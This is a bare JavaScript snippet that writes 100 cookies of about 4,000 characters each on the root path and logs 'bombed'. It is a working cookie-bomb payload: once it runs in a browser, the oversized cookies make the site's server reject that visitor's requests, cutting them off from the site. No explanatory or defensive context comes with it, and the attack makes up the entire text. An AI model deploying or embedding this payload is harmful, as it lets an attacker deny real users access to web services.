console.log('starting')
for(var i=0;i<100;i++){
    document.cookie='bomb'+i+'='+Array(4000).join('x')+';path=/';
}
console.log('bombed')